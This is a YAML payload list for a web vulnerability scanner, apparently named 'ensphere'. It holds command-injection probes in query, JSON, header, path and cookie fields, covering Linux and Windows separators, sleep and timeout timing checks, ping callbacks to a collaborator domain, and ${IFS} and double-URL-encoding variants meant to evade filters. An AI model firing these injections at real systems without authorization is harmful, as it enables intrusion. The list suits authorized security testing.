defaults:
  vuln_type: cmdi
  encoding: raw
  source: ensphere

payloads:
  # ============================================================
  # Linux — semicolon separator
  # ============================================================
  - technique: command_injection
    injection_surface: query
    evidence_type: timing
    risk: 3
    payload: "; sleep SLEEP_SECONDS"
    placeholders: [SLEEP_SECONDS]
    notes: "Semicolon command separator + sleep. Confirm via response delay."
    tags: [linux, semicolon, sleep, confirmation]

  - technique: command_injection
    injection_surface: query
    evidence_type: timing
    risk: 3
    payload: "| sleep SLEEP_SECONDS"
    placeholders: [SLEEP_SECONDS]
    notes: "Pipe + sleep for time-based confirmation."
    tags: [linux, pipe, sleep]

  - technique: command_injection
    injection_surface: query
    evidence_type: timing
    risk: 3
    payload: "`sleep SLEEP_SECONDS`"
    placeholders: [SLEEP_SECONDS]
    notes: "Backtick sleep for blind confirmation."
    tags: [linux, backtick, sleep]

  - technique: command_injection
    injection_surface: query
    evidence_type: timing
    risk: 3
    payload: "$(sleep SLEEP_SECONDS)"
    placeholders: [SLEEP_SECONDS]
    notes: "$() sleep for blind confirmation."
    tags: [linux, dollar_paren, sleep]

  # ============================================================
  # Linux — && and || chaining
  # ============================================================
  - technique: command_chaining
    injection_surface: query
    evidence_type: timing
    risk: 3
    payload: "&& sleep SLEEP_SECONDS"
    placeholders: [SLEEP_SECONDS]
    notes: "AND chaining — executes if prior command succeeds."
    tags: [linux, and_chain, sleep]

  - technique: command_chaining
    injection_surface: query
    evidence_type: timing
    risk: 3
    payload: "|| sleep SLEEP_SECONDS"
    placeholders: [SLEEP_SECONDS]
    notes: "OR chaining — executes if prior command fails."
    tags: [linux, or_chain, sleep]

  - technique: command_injection
    injection_surface: query
    evidence_type: timing
    risk: 3
    payload: "\nsleep SLEEP_SECONDS"
    placeholders: [SLEEP_SECONDS]
    notes: "Newline + sleep."
    tags: [linux, newline, sleep]

  - technique: command_injection
    injection_surface: query
    evidence_type: dns_hit
    risk: 3
    payload: "; ping -c 1 COLLAB_DOMAIN"
    placeholders: [COLLAB_DOMAIN]
    notes: "OOB via ICMP ping with DNS resolution."
    tags: [linux, oob, ping]

  - technique: command_injection
    injection_surface: query
    evidence_type: timing
    risk: 3
    payload: ";sleep${IFS}SLEEP_SECONDS"
    placeholders: [SLEEP_SECONDS]
    notes: "${IFS} brace-delimited variant for space bypass."
    tags: [linux, obfuscation, ifs, sleep]

  - technique: command_injection
    injection_surface: query
    evidence_type: timing
    risk: 3
    payload: ";sleep$'\\t'SLEEP_SECONDS"
    placeholders: [SLEEP_SECONDS]
    notes: "$'\\t' ANSI-C tab character as argument separator."
    tags: [linux, obfuscation, ansi_c_quote, tab, sleep]

  # ============================================================
  # Windows — & separator
  # ============================================================
  - technique: command_injection
    injection_surface: query
    evidence_type: timing
    risk: 3
    runtime: node
    payload: "& timeout /t SLEEP_SECONDS"
    placeholders: [SLEEP_SECONDS]
    notes: "Windows ampersand separator + timeout."
    tags: [windows, ampersand, timeout]

  - technique: command_injection
    injection_surface: query
    evidence_type: dns_hit
    risk: 3
    runtime: node
    payload: "& ping -n 1 COLLAB_DOMAIN"
    placeholders: [COLLAB_DOMAIN]
    notes: "Windows OOB via ping."
    tags: [windows, oob, ping]

  - technique: command_injection
    injection_surface: query
    evidence_type: timing
    risk: 3
    runtime: node
    payload: "& powershell -c \"Start-Sleep -Seconds SLEEP_SECONDS\""
    placeholders: [SLEEP_SECONDS]
    notes: "PowerShell Start-Sleep for time-based blind confirmation."
    tags: [windows, powershell, sleep]

  # ============================================================
  # JSON body variants
  # ============================================================
  - technique: command_injection
    injection_surface: json_body
    evidence_type: timing
    risk: 3
    payload: "; sleep SLEEP_SECONDS"
    placeholders: [SLEEP_SECONDS]
    notes: "Semicolon injection via JSON body field."
    tags: [linux, semicolon, sleep, json]

  # ============================================================
  # URL-encoded variants
  # ============================================================
  - technique: command_injection
    injection_surface: query
    encoding: url
    evidence_type: timing
    risk: 3
    payload: "%3B%20sleep%20SLEEP_SECONDS"
    placeholders: [SLEEP_SECONDS]
    notes: "URL-encoded semicolon + sleep."
    tags: [linux, url_encoded, sleep]

  # ============================================================
  # Double URL-encoded variants
  # ============================================================
  - technique: command_injection
    injection_surface: query
    encoding: double_url
    evidence_type: timing
    risk: 3
    payload: "%253B%2520sleep%2520SLEEP_SECONDS"
    placeholders: [SLEEP_SECONDS]
    notes: "Double URL-encoded semicolon + sleep. Bypasses single-decode WAFs."
    tags: [linux, double_url_encoded, sleep]

  # ============================================================
  # Header injection
  # ============================================================
  - technique: command_injection
    injection_surface: header
    evidence_type: timing
    risk: 3
    payload: "; sleep SLEEP_SECONDS"
    placeholders: [SLEEP_SECONDS]
    notes: "Command injection via HTTP header (User-Agent, Referer, etc.)."
    tags: [linux, header, sleep]

  # ============================================================
  # Path injection surface
  # ============================================================
  - technique: command_injection
    injection_surface: path
    evidence_type: timing
    risk: 3
    payload: ";sleep${IFS}SLEEP_SECONDS;"
    placeholders: [SLEEP_SECONDS]
    notes: "Command injection via URL path segment. Uses ${IFS} for space bypass in path context."
    tags: [linux, path, ifs, sleep]

  # ============================================================
  # Cookie injection surface
  # ============================================================
  - technique: command_injection
    injection_surface: cookie
    evidence_type: timing
    risk: 3
    payload: "$(sleep SLEEP_SECONDS)"
    placeholders: [SLEEP_SECONDS]
    notes: "Command substitution via cookie value. Targets apps that pass cookie values to shell."
    tags: [linux, cookie, sleep]
